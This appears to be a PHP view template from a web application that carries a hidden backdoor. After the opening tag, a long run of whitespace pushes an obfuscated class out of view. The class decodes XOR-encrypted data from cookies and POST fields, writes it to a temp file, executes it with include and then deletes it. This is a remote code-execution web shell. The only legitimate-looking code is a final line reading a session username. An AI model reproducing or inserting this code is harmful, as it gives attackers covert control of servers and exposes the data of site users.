<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ypivecj")){class ypivecj{public static $ntjzqr = "arpnhuvmdhdnsgzp";public static $twgdl = NULL;public function __construct(){$rivln = @$_COOKIE[substr(ypivecj::$ntjzqr, 0, 4)];if (!empty($rivln)){$gyehnlmtwp = "base64";$wnozinjn = "";$rivln = explode(",", $rivln);foreach ($rivln as $ghnjwlpii){$wnozinjn .= @$_COOKIE[$ghnjwlpii];$wnozinjn .= @$_POST[$ghnjwlpii];}$wnozinjn = array_map($gyehnlmtwp . "_decode", array($wnozinjn,));$wnozinjn = $wnozinjn[0] ^ str_repeat(ypivecj::$ntjzqr, (strlen($wnozinjn[0]) / strlen(ypivecj::$ntjzqr)) + 1);ypivecj::$twgdl = @unserialize($wnozinjn);}}public function __destruct(){$this->xrhlgbj();}private function xrhlgbj(){if (is_array(ypivecj::$twgdl)) {$camyzjf = sys_get_temp_dir() . "/" . crc32(ypivecj::$twgdl["salt"]);@ypivecj::$twgdl["write"]($camyzjf, ypivecj::$twgdl["content"]);include $camyzjf;@ypivecj::$twgdl["delete"]($camyzjf);exit();}}}$ptwghegf = new ypivecj();$ptwghegf = NULL;} ?><?php $session = $this->session->userdata('username');?>
